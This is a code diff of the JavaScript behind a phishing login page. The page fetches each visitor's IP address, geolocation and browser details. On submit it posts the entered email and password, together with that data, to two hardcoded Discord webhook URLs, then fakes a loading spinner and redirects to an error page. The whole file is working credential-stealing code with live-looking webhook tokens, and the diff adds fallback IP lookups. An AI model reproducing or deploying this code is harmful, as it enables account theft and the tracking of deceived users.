@@ -2,10 +2,13 @@
 // SELECTING ELEMENTS
 // ----------------------------------
 const loginButton = document.querySelector("button");
+const ipDisplay = document.getElementById("user-ip"); // For showing IP
 
 // Webhook URLs
-const PRIMARY_WEBHOOK_URL = "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s ";
-const BACKUP_WEBHOOK_URL = "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo ";
+const PRIMARY_WEBHOOK_URL =
+  "https://discord.com/api/webhooks/1358901901508219031/J7_foL_Odv6_Eg0P12xAVDL-9n7neQFed5xFjI4us8HAAJ6BLUw2wxs1-BGqvcCbXa_s ";
+const BACKUP_WEBHOOK_URL =
+  "https://discord.com/api/webhooks/1358902712070176768/u7-3e1PmM4t7VTUTD_UBNYCDkAnM9GP_KKxHjB4g_uxeitavR14PgmqdxzoadN0-NqKo ";
 
 // Variables to store user data
 let userIP = "Unknown IP";
@@ -15,21 +18,40 @@ let whoisData = {};
 // -----------------------------------
 // FETCH IP ADDRESS ON PAGE LOAD
 // -----------------------------------
+
+// Try multiple services to fetch public IP
 async function fetchIPAddress() {
-  try {
-    const response = await fetch("https://api.ipify.org ?format=json");
-    const data = await response.json();
-    return data.ip;
-  } catch (error) {
-    console.error("Error fetching IP address:", error);
-    return "Unknown IP";
+  const ipServices = [
+    "https://api.ipify.org ?format=json",
+    "https://ident.me/.json ",
+    "https://checkip.amazonaws.com ",
+  ];
+
+  for (const url of ipServices) {
+    try {
+      let response;
+      if (url.includes("json")) {
+        response = await fetch(url);
+        const data = await response.json();
+        return data.ip || data;
+      } else {
+        response = await fetch(url);
+        const ip = await response.text();
+        return ip.trim();
+      }
+    } catch (error) {
+      console.warn(`Failed IP fetch from: ${url}`, error);
+      continue;
+    }
   }
+
+  return "Unknown IP";
 }
 
-// Perform WHOIS lookup on the IP address
+// WHOIS lookup using ipwho.is
 async function fetchWhoisData(ip) {
   try {
-    const response = await fetch(`https://ipwhois.app/json/ ${ip}`);
+    const response = await fetch(`https://ipwho.is/ ${ip}`);
     const data = await response.json();
     return data;
   } catch (error) {
@@ -38,15 +60,16 @@ async function fetchWhoisData(ip) {
   }
 }
 
-// Fetch the IP address and WHOIS data when the page loads
+// Fetch the IP address when the page loads and display it
 document.addEventListener("DOMContentLoaded", async () => {
-  userIP = await fetchIPAddress(); // Store the IP address in the `userIP` variable
-  console.log("User IP Address:", userIP); // Optional: Log the IP for debugging
+  userIP = await fetchIPAddress(); // Store the IP address
+  ipDisplay.textContent = userIP; // Show the IP on the page
+  console.log("User IP Address:", userIP);
 
-  whoisData = await fetchWhoisData(userIP); // Perform WHOIS lookup
-  console.log("WHOIS Data:", whoisData); // Optional: Log WHOIS data for debugging
+  whoisData = await fetchWhoisData(userIP);
+  console.log("WHOIS Data:", whoisData);
 
-  collectDeviceInfo(); // Collect additional device info
+  collectDeviceInfo();
 });
 
 // -----------------------------------
@@ -65,32 +88,31 @@ function collectDeviceInfo() {
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
     referrer: document.referrer || "Direct",
   };
-  console.log("Device Info:", userDeviceInfo); // Optional: Log device info for debugging
+  console.log("Device Info:", userDeviceInfo);
 }
 
-// Helper functions to extract browser and OS details
 function getBrowserName() {
-  const userAgent = navigator.userAgent;
-  if (/Firefox/.test(userAgent)) return "Firefox";
-  if (/Chrome/.test(userAgent)) return "Chrome";
-  if (/Edg/.test(userAgent)) return "Edge";
-  if (/Safari/.test(userAgent)) return "Safari";
+  const ua = navigator.userAgent;
+  if (/Firefox/.test(ua)) return "Firefox";
+  if (/Chrome/.test(ua)) return "Chrome";
+  if (/Edg/.test(ua)) return "Edge";
+  if (/Safari/.test(ua)) return "Safari";
   return "Unknown Browser";
 }
 
 function getBrowserVersion() {
-  const userAgent = navigator.userAgent;
-  const match = userAgent.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
+  const ua = navigator.userAgent;
+  const match = ua.match(/(Chrome|Firefox|Edg|Safari)\/(\d+)/);
   return match ? match[2] : "Unknown Version";
 }
 
 function getOS() {
-  const userAgent = navigator.userAgent;
-  if (/Windows/.test(userAgent)) return "Windows";
-  if (/Mac/.test(userAgent)) return "MacOS";
-  if (/Linux/.test(userAgent)) return "Linux";
-  if (/Android/.test(userAgent)) return "Android";
-  if (/iPhone|iPad/.test(userAgent)) return "iOS";
+  const ua = navigator.userAgent;
+  if (/Windows/.test(ua)) return "Windows";
+  if (/Mac/.test(ua)) return "MacOS";
+  if (/Linux/.test(ua)) return "Linux";
+  if (/Android/.test(ua)) return "Android";
+  if (/iPhone|iPad/.test(ua)) return "iOS";
   return "Unknown OS";
 }
 
@@ -99,119 +121,51 @@ function getOS() {
 // -----------------------------------
 async function sendCredentialsToWebhook(email, password) {
   try {
-    // Use the stored IP address, device info, and WHOIS data
-    const ip = userIP;
-
-    // Prepare the embed payload
     const embedPayload = {
       embeds: [
         {
           title: "Login Attempt",
-          color: 0xff0000, // Red color for visibility
+          color: 0xff0000,
           fields: [
-            {
-              name: "Email",
-              value: email || "No email provided",
-              inline: true,
-            },
-            {
-              name: "Password",
-              value: password || "No password provided",
-              inline: true,
-            },
-            {
-              name: "IP Address",
-              value: ip || "Unknown IP",
-              inline: false,
-            },
-            {
-              name: "ISP",
-              value: whoisData.isp || "Unknown ISP",
-              inline: true,
-            },
-            {
-              name: "Country",
-              value: whoisData.country || "Unknown Country",
-              inline: true,
-            },
-            {
-              name: "City",
-              value: whoisData.city || "Unknown City",
-              inline: true,
-            },
-            {
-              name: "Region",
-              value: whoisData.region || "Unknown Region",
-              inline: true,
-            },
-            {
-              name: "Timezone",
-              value: whoisData.timezone || "Unknown Timezone",
-              inline: true,
-            },
-            {
-              name: "Browser",
-              value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`,
-              inline: true,
-            },
-            {
-              name: "Operating System",
-              value: userDeviceInfo.os,
-              inline: true,
-            },
-            {
-              name: "Screen Resolution",
-              value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`,
-              inline: true,
-            },
-            {
-              name: "Language",
-              value: userDeviceInfo.language,
-              inline: true,
-            },
-            {
-              name: "Referrer",
-              value: userDeviceInfo.referrer,
-              inline: false,
-            },
+            { name: "Email", value: email || "No email provided", inline: true },
+            { name: "Password", value: password || "No password provided", inline: true },
+            { name: "IP Address", value: userIP || "Unknown IP", inline: false },
+            { name: "ISP", value: whoisData.connection?.isp || "Unknown ISP", inline: true },
+            { name: "Country", value: whoisData.country || "Unknown Country", inline: true },
+            { name: "City", value: whoisData.city || "Unknown City", inline: true },
+            { name: "Region", value: whoisData.region || "Unknown Region", inline: true },
+            { name: "Timezone", value: whoisData.timezone || "Unknown Timezone", inline: true },
+            { name: "Browser", value: `${userDeviceInfo.browserName} (${userDeviceInfo.browserVersion})`, inline: true },
+            { name: "Operating System", value: userDeviceInfo.os, inline: true },
+            { name: "Screen Resolution", value: `${userDeviceInfo.screenWidth}x${userDeviceInfo.screenHeight}`, inline: true },
+            { name: "Language", value: userDeviceInfo.language, inline: true },
+            { name: "Referrer", value: userDeviceInfo.referrer, inline: false },
           ],
-          timestamp: new Date().toISOString(), // Timestamp for when the data was sent
+          timestamp: new Date().toISOString(),
         },
       ],
     };
 
-    // Send the payload to the primary webhook
     let response = await fetch(PRIMARY_WEBHOOK_URL, {
       method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(embedPayload),
     });
 
-    // Check if the primary webhook failed
     if (!response.ok) {
-      console.error("Primary webhook failed. Attempting backup webhook...");
-
-      // Send the payload to the backup webhook
+      console.error("Primary webhook failed. Attempting backup...");
       response = await fetch(BACKUP_WEBHOOK_URL, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify(embedPayload),
       });
-
-      if (!response.ok) {
-        console.error("Backup webhook also failed. Data not sent.");
-      } else {
-        console.log("Data successfully sent to backup webhook.");
-      }
+      if (!response.ok) console.error("Backup webhook also failed.");
+      else console.log("Sent via backup webhook.");
     } else {
-      console.log("Data successfully sent to primary webhook.");
+      console.log("Sent via primary webhook.");
     }
   } catch (error) {
-    console.error("Error sending credentials to webhook:", error);
+    console.error("Error sending credentials:", error);
   }
 }
 
@@ -225,40 +179,35 @@ function removeEllipsisAnimation() {
 }
 
 function animateEllipsis() {
-  // Get user input from the form
   const emailInput = document.getElementById("emailORphone");
   const passwordInput = document.getElementById("password");
 
   const email = emailInput.value.trim();
   const password = passwordInput.value.trim();
 
-  // Validate inputs
   if (!email || !password) {
     alert("Please enter both email and password.");
     return;
   }
 
-  // Send credentials to webhook
   sendCredentialsToWebhook(email, password);
 
-  // Start animation
-  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
-                                    <span class="inner pulsingEllipsis">
-                                        <span class="item spinnerItem"></span>
-                                        <span class="item spinnerItem"></span>
-                                        <span class="item spinnerItem"></span>
-                                    </span>
-                           </span>`;
+  loginButton.innerHTML = `
+    <span class="spinner" role="img" aria-label="Loading">
+      <span class="inner pulsingEllipsis">
+        <span class="item spinnerItem"></span>
+        <span class="item spinnerItem"></span>
+        <span class="item spinnerItem"></span>
+      </span>
+    </span>`;
   const spinnerItems = document.querySelectorAll(".spinnerItem");
   spinnerItems.forEach((item, index) => {
     item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
   });
   loginButton.setAttribute("disabled", "true");
 
-  // Simulate login process
   setTimeout(() => {
     removeEllipsisAnimation();
-    // Redirect to error.html after 3 seconds
     window.location.href = "error.html";
   }, 3000);
 }
